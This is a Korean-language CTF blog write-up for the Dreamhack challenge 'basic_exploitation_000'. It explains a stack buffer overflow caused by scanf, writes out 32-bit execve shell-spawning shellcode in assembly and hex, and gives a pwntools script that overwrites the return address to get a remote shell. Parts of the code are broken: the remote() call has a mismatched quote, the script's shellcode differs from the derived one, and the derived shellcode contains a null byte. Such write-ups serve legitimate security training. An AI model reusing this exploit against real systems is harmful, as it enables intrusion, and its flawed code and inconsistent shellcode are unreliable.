---
title: basic_exploitation_000
description: Dreamhack [Wargame] - basic_exploitation_000
author: juhyeongkim
date: 2024-10-31 3:33:00 +0900
categories: [Dreamhack, Wargame]
tags: [Dreamhack, Wargame, Pwnable]
# toc: false
# comments: false
# math: true
# mermaid: true
# image:
#   path: 
#   lqip: 
#   alt: 
---

[문제 링크](https://dreamhack.io/wargame/challenges/2)

## 문제 풀이 방법

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}
```

위 코드를 보면 `initialize()` 함수에서 `SIGALRM`을 발생시키고 30초가 지나면 `alarm_handler` 함수가 수행되어 `exit(-1);`에 의해 프로그램이 종료된다.  
따라서 30초가 넘어가기 전에 해당 프로그램을 익스플로잇하여 쉘코드를 실행해야한다.

이 문제에서는 scanf 함수의 취약점을 통해 익스플로잇 할 수 있다. buf의 크기는 0x80(128)인데 141 바이트 크기의 string을 입력받고 있기 때문에, `sfp`와 `return address`를 덮어쓸 수 있다.  

```c
|-----------------------|   Low Address
|          buf          |
|          buf          |  <= 0x80
|          buf          |
|-----------------------|
|          SFP          |  <= 0x04
|-----------------------|
|          RET          |  <= 0x04
|-----------------------|   High Address
```

해당 코드에서 `printf("buf = (%p)\n", buf);`를 통해 buf의 주소를 print해주는데,

1. buffer의 주소를 return address에 넣고

2. buffer에는 쉘코드를 삽입하면 쉘을 얻을 수 있다.

<br>

## 쉘코드 작성

우리가 작성하고자 하는 쉘 코드는 `execve('bin/sh', 0, 0);`을 실행하여 쉘을 얻는 코드이다. 내용은 아래와 같다.

참고로 문제의 해당 실행 환경이 **i386(x86)** 이므로 32bit에 맞춰 어셈블리 코드를 작성해야한다. 

```
section .text
global _start

_start:
    xor eax,eax       ; 뒤에서 execve() 콜을 위해 eax를 0으로 초기화해주는 부분 (대부분 0이 들어있기 때문에 필수적이지는 않지만 권장)
    push 0x68732f     ; push 0x0068732f와 같다.
    push 0x6e69622f   ; 여기서 두번째 push때 4바이트 크기의 값이 아닌 3바이트 크기의 값이 push되면 끝에 0x00(Null String)이 추가되어 String이 이어지지 않고 끊기게 되니까 주의하자 ex) push 0x69622f
    mov ebx, esp      ; arg0 : ebx = 'bin/sh'
    xor ecx, ecx      ; arg1 : ecx = 0
    xor edx, edx      ; arg2 : edx = 0
    mov al, 0x8       ; mov eax, 0x8도 가능하지만, 더 효율적인 작업을 위해 al에 0x8 대입
    inc al            ; eax = 0x9
    inc al            ; eax = 0xa
    inc al            ; eax = 0xb
    int 0x80          ; execve call 발생
```

1. `eax`를 0으로 초기화 하는 이유는 뒤에서 eax가 아닌 `al`에 0x8을 대입하는데, al은 1바이트 공간이기 때문에 혹시라도 만약 al 상위 바이트가 0으로 초기화되어 있지 않으면 0x8이 아닌 다른 값으로 eax가 인식되기 때문에 `xor eax, eax`를 통해 0으로 초기화시켜준다.  
(만약 `mov al, 0x8`이 아닌 `mov eax, 0x8` 이라면 초기화할 필요 X)

2. 이후 push를 통해 esp에 값을 대입하는데 무조건 처음 push할 때, 나머지를 가져가고 이후 push에서는 4바이트 단위로만 push 해야 중간에 `0x00(NULL String)`이 삽입되지 않는다.

3. 32bit에서는 system call의 인자가 `rdi, rsi, rdx, ...` 순이 아닌 `ebx, ecx, edx, ...' 순이기 때문에 ebx에 esp값을 대입해주고 나머지 인자를 0으로 초기화시켜준다.

4. 32bit에서 execve의 system call 번호(eax 값)는 `0xb`인데, ASCII 값에서 `0xb`는 개행문자이므로, 이를 scanf에 입력하면 개행문자까지만 값을 받고 뒤의 값을 버리게 되기 때문에, 개행문자가 아닌 `mov al, 0x8`이후 `inc al`을 3번하여 eax에 `0xb`를 대입해야한다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbaFBgG%2FbtrUtG8jkdw%2FWx912dGg3GcIdDJL7ROEi1%2Fimg.png)


6. 32bit에서 systemcall은 `syscall`이 아닌 `int 0x80`으로 수행한다.

7. 이후 쉘코드를 얻어오면 다음 값을 갖는다. `\x31\xc0\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x08\xfe\xc0\xfe\xc0\xfe\xc0\xcd\x80`

<br>

## 익스플로잇 코드 작성

1. 프로그램 실행에서 buf의 주소를 print해주는데, 이 주소를 받아와서 return address에 삽입하기 위해 `buf_address`에 기록한다.    
여기서, `p.recvuntil(b'buf = (')`를 통해 받은 값은 String 값인데, 주소는 String 값이 아닌 정수 값으로 해석되기 때문에 이 String 값을 정수값으로 변경해준다. (String을 ASCII 값에 따라 정수로 해석하는 것이 아닌 정수 그 자체로 해석)
그리고 0xnnnnnnnn까지만 받아야 하므로 10byte만 받는다.

2. buf에는 shellcode를 입력하고, shellcode를 입력하고 **남은 buf 공간과**, **sfp**공간은 아무 값으로 채워서 payload에 전달해준다. (buf space + sfp space = 0x84)

3. 이후 return_address에 우리가 저장한 `buf_address`를 little endian byte string 배열로 packing해서 payload에 전달한다.

4. 공격 수행 후 쉘을 획득하면 `ls`와 `cat` 명령어를 통해 flag를 읽어온다.

익스플로잇 코드는 아래와 같다.

```py
from pwn import *

context.arch = "i386"
p = remote("host3.dreamhack.games", 21235")

p.recvuntil(b'buf = (')
buf_address = int(p.recv(10), 16) # 10byte만큼 recv후 받은 값을 16진수로 해석하여 buf_address에 저장

shellcode = b'\x31\xc0\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb8\x08\x00\x00\x00\x40\x40\x40\xcd\x80'

payload = shellcode + b'a'*(0x84-len(shellcode)) + p32(buf_address)

p.sendline(payload)

p.interactive()
```